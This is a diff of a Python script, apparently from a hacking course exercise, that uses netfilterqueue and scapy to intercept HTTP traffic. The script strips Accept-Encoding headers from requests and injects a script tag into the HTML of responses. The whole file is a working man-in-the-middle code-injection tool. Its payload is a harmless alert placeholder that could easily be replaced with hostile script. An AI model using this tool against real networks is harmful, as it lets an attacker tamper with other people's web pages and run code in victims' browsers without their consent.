@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # Rebuild - View README for testing parameters.
 import netfilterqueue
-from scapy.layers.inet import IP, TCP
+from scapy.layers.inet import IP, TCP, UDP
 from scapy.layers.dns import Raw
 import re
 
@@ -15,6 +15,9 @@ def set_load(packet, load):
     del packet[IP].len
     del packet[IP].chksum
     del packet[TCP].chksum
+    # if packet.haslayer(UDP):
+    #     del packet[UDP].len
+    #     del packet[UDP].chksum
     return packet
 
 def process_packet(packet):
@@ -25,22 +28,33 @@ def process_packet(packet):
             if scapy_packet[TCP].dport == 80:
                 print("[+] This is a HTTP Request:  ")
                 # Find "Accept-Encoding" in payload, replace with ""
-                modified_load = re.sub(AcceptEncodingRegex, "", scapy_packet[Raw].load)
+                # print("[+] Current Load: ")
+                # print(scapy_packet[Raw].load)
+                modified_load = re.sub(
+                    "Accept-Encoding:.*?\\r\\n",
+                    "",
+                    scapy_packet[Raw].load,
+                    flags=re.IGNORECASE | re.MULTILINE
+                )
                 # Create a new packet
                 new_packet = set_load(scapy_packet, modified_load)
+                # print("[+] New Load: ")
+                # print(new_packet[Raw].load)
                 # set the new packet with the updated payload to the actual packet
                 packet.set_payload(str(new_packet))
-            # After testing the above, we should get nothing but clean HTML page markup
-            # in the payload.
+                # After testing the above, we should get nothing but clean HTML page markup
+                # in the payload.
             elif scapy_packet[TCP].sport == 80:
-                print("[+] This is a HTTP Response: ")
+                # print("[+] This is a HTTP Response: ")
+                # print(scapy_packet[Raw].load)
                 # invoke python method replace to replace a string with another string
-                modified_load = scapy_packet[Raw].load.replace
-
+                modified_load = scapy_packet[Raw].load.replace("</body>", "<script>alert('Test!'); </script></body>")
+                new_packet = set_load(scapy_packet, modified_load)
+                packet.set_payload(str(new_packet))
     packet.accept()
 
 
 if __name__ == "__main__":
     queue = netfilterqueue.NetfilterQueue()
-    queue.bind(2, process_packet)
+    queue.bind(0, process_packet)
     queue.run()
